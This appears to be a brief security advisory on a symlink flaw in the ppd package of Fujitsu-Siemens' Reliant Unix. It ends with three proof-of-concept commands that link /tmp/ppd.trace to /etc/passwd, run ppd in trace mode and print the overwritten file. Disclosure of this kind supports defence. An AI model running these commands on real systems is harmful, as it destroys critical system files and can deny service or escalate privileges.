Reliant Unix is a variant of the UNIX Operating System distributed by Fujitsu-Siemens. Reliant Unix is a scalable UNIX Operating system designed for use on Siemens servers.

A problem in the operating system could make it possible for a user to deny service to legitimate users. Due to the improper checking of file creation rights by the ppd software package included with the operating system, it is possible for a user to create a symbolic link in /tmp with the name ppd.trace, and overwrite any file on the system.

This vulnerability makes it possible for a local user to overwrite sensitive system files, potentially denying service to legitimate users, and possibly gaining elevated privileges.

ln -s /etc/passwd /tmp/ppd.trace

/opt/bin/ppd -T

cat /etc/passwd
